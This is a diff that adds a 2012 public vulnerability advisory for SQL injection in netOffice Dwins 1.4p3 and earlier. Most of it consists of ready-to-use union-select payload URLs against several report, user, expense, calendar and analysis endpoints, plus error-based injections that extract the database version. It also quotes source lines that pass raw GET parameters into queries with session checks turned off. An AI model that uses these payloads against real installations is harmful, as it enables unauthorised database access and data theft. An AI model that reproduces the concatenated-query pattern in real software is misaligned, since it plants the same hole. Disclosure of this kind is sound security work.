@@ -1,0 +1,59 @@
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+
+   [ Discovered by dun \ posdub[at]gmail.com ]
+   [ 2012-11-08                              ]
+ #################################################################
+ #  [ netOffice Dwins <= 1.4p3 ]  SQL Injection Vulnerability    #
+ #################################################################
+ #
+ # Script: "netOffice Dwins is a free web based time tracking, timesheet, 
+ #          content management, issue tracking, and project management environment."
+ #
+ # Vendor:   http://sourceforge.net/projects/netofficedwins/
+ # Download: http://sourceforge.net/projects/netofficedwins/files/netofficedwins/1.4p3/
+ #
+ #################################################################
+ # [SQL Injection]
+ #
+ # reports/export_leaves.php?S_ATSEL=-1) union select 0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0--
+ # File: reports/export_leaves.php ( lines: 16-107 ):
+ # ..cut..
+ #       $S_mem = $_GET['S_ATSEL'];          //1
+ # ..cut..
+ # $checkSession = false;                    //2
+ # require_once("../includes/library.php");
+ # ..cut..
+ #   $query .= " AND wkh.owner IN($S_mem)";  //3
+ # ..cut..
+ # $tmpquery = "$query ORDER BY wkh.owner";  //4
+ # $listWorkHours = new request();
+ # $listWorkHours->openWorkHours($tmpquery); //5 SQL
+ # ..cut..
+ #
+ # users/exportuser.php?id=-1 union select 0,0,0,0,0,1,1,1,0,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0--
+ # File: users/exportuser.php ( lines: 15-21 ): 
+ # ..cut..
+ # $checkSession = false;                    //1
+ # require_once("../includes/library.php");
+ # require_once("../includes/vcard.class.php");
+ # $id = $_GET['id'];                        //2
+ # $tmpquery = " WHERE mem.id=$id";          //3
+ # $userDetail = new request();
+ # $userDetail->openMembers($tmpquery);      //4 SQL
+ # ..cut..
+ #
+ # reports/export_person_performance.php?S_ATSEL=-1) union select 0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,1,0,0--
+ # expenses/approveexpense.php?id=-1 union select 0,0,0,0,1,1,0,0,0,0,1,1,0,0,1,0,0,0,0,0--&auth=1&doc=-1 union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
+ # calendar/exportcalendar.php?id=-1' union select 0,0,0,1,1,0,1,1,0,0,0,0,0,0,0,0,1--
+ #
+ # [Blind SQL Injection]
+ #
+ # analysis/expanddimension.php?id=-1' union select 0,0,0,0,0,0,0,0,0,0,extractvalue(1,concat(0x2e,(SELECT @@version)))--
+ # analysis/changedimensionsortingorder.php?id=-1' union select 0,0,0,0,0,0,0,0,0,0,extractvalue(1,concat(0x2e,(SELECT @@version)))--
+ #
+ ### [ dun / 2012 ] #############################################
